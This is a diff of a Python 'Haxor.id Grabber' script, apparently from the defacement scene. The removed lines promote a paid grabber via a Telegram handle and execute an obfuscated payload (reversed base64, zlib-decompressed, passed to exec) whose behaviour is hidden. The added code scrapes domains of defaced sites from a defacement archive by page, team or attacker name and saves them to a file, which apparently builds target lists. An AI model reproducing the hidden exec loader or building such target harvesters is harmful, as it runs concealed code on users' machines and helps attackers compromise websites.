@@ -1,4 +1,97 @@
+# baik banget gw mah 
 
-# buy script grabber haxor.id t.me/RehanSec12  
-                  
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import requests
+import re
+import time
+from bs4 import BeautifulSoup
+from colorama import Fore, init
+
+init(autoreset=True)
+
+def save(data, filename):
+    with open(filename, "a") as file:
+        file.write(data + "\n")
+
+def get_list_domain(content, saveas):
+    soup = BeautifulSoup(content, "html.parser")
+    domains = set()
+    
+    
+    for td in soup.find_all("td"):
+        match = re.search(r"(https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", td.text)
+        if match:
+            domain = match.group(2)
+            domains.add(domain)
+    
+    # Simpan hasil & tampilkan
+    for domain in sorted(domains):
+        print(f"{Fore.GREEN}[✓] {domain}")
+        save(domain, saveas)
+
+def get_page(from_url):
+    start_page = int(input('Grab From Page (example: 1): '))
+    end_page = int(input('Grab To Page (Max Page 50): '))
+    saveas = input('Save As (example.txt): ')
+    
+    if end_page > 50:
+        print(f"{Fore.RED}Max Page Is 50!!")
+        return
+    
+    for page in range(start_page, end_page + 1):
+        page_url = f"{from_url}?page={page}"
+        print(f"{Fore.YELLOW}[*] Grabbing from {page_url}...")
+        
+        try:
+            response = requests.get(page_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
+            if response.status_code == 200:
+                get_list_domain(response.text, saveas)
+            else:
+                print(f"{Fore.RED}[!] Failed to retrieve {page_url}")
+        except requests.RequestException as e:
+            print(f"{Fore.RED}[!] Request failed: {e}")
+        
+        time.sleep(2)  
+    
+    print(f"{Fore.CYAN}[✓] Grab List Domain Success")
+
+def choose():
+    print(f"{Fore.RED}\n╭──>> {Fore.WHITE}Haxor.id {Fore.RED}Grabber")
+    print(f"│  {Fore.YELLOW}Created by RehanHaxor")
+    print(f"│─────────────────────────")
+    print(f"│({Fore.YELLOW}1{Fore.RED}). => {Fore.WHITE}Grab From Archive")
+    print(f"│({Fore.YELLOW}2{Fore.RED}). => {Fore.WHITE}Grab From Onhold")
+    print(f"│({Fore.YELLOW}3{Fore.RED}). => {Fore.WHITE}Grab From Special")
+    print(f"│({Fore.YELLOW}4{Fore.RED}). => {Fore.WHITE}Grab From Team")
+    print(f"│({Fore.YELLOW}5{Fore.RED}). => {Fore.WHITE}Grab From Attacker/Defacer")
+    print(f"│({Fore.YELLOW}0{Fore.RED}). => {Fore.WHITE}Exit")
+    print(f"╰─────────────────────────")
+    
+    choice = input(f"{Fore.YELLOW}[ pilih menu ]~#")
+    
+    if choice == '1':
+        url = 'https://haxor.id/archive'
+        get_page(url)
+    elif choice == '2':
+        url = 'https://haxor.id/onhold'
+        get_page(url)
+    elif choice == '3':
+        url = 'https://haxor.id/special'
+        get_page(url)
+    elif choice == '4':
+        team_name = input('Team Name: ').replace(' ', '%20')
+        url = f"https://haxor.id/archive/team/{team_name}"
+        get_page(url)
+    elif choice == '5':
+        attacker_name = input('Name Attacker/Defacer: ').replace(' ', '%20')
+        url = f"https://haxor.id/archive/attacker/{attacker_name}"
+        get_page(url)
+    elif choice == '0':
+        print(f"{Fore.CYAN}Exiting...")
+        return False
+    else:
+        print(f"{Fore.RED}Choose 1-5!!")
+    return True
+
+if __name__ == "__main__":
+    while choose():
+        print(f"{Fore.CYAN}\nReturning to main menu...\n")
